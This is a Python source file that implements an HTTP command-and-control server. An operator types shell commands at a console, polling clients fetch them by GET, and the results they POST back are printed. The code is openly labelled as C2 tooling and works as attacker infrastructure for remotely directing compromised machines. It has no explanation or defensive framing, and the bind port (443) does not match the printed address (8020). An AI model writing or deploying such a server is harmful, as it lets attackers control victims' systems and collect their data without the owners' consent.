#httpserver.py

from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
import queue


command_queue = queue.Queue()
response_queue = queue.Queue()

class C2HTTPHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        # Custom logging - shows client IP and request
        print(f"{self.client_address[0]} - {format % args}")
    
    def do_GET(self):
        """Client checking for commands"""
        try:
            cmd = command_queue.get(timeout=2)
            print(f"[+] Sending command to {self.client_address[0]}: {cmd}")
            
            self.send_response(200)
            self.end_headers()
            self.wfile.write(cmd.encode())
            
        except queue.Empty:
            # No commands available
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"NOOP")
    
    def do_POST(self):
        """Client sending command results back"""
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        
        response_queue.put((self.client_address[0], post_data.decode()))
        
       
        print(f"\n[+] Response from {self.client_address[0]}:")
        print("-" * 50)
        print(post_data.decode())
        print("-" * 50)
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ACK")

def start_http_server():
    """Start HTTP server in background thread"""
    server = HTTPServer(('192.168.1.5', 443), C2HTTPHandler)
    print(f"[+] HTTP C2 Server running on http://192.168.1.5:8020")
    print(f"[+] Waiting for client connections...")
    server.serve_forever()

def command_interface():
    """Interactive command interface"""
    print("\n[C2] > Type commands for client")
    print("[C2] > Type 'status' to check queue")
    print("[C2] > Type 'exit' to quit")
    
    while True:
        try:
            cmd = input("\n[C2] > ").strip()
            
            if cmd.lower() == 'exit':
                print("[+] Shutting down server...")
                break
            elif cmd.lower() == 'status':
                print(f"[+] Commands in queue: {command_queue.qsize()}")
                print(f"[+] Responses waiting: {response_queue.qsize()}")
                continue
            elif cmd:
               
                command_queue.put(cmd)
                print(f"[+] Command queued: {cmd}")
                
                
                
        except KeyboardInterrupt:
            print("\n[!] Server interrupted by user")
            break

if __name__ == "__main__":
    # Start HTTP server in background thread
    server_thread = threading.Thread(target=start_http_server, daemon=True)
    server_thread.start()
    
   
    command_interface()
    
    print("\n[+] Server shutdown complete")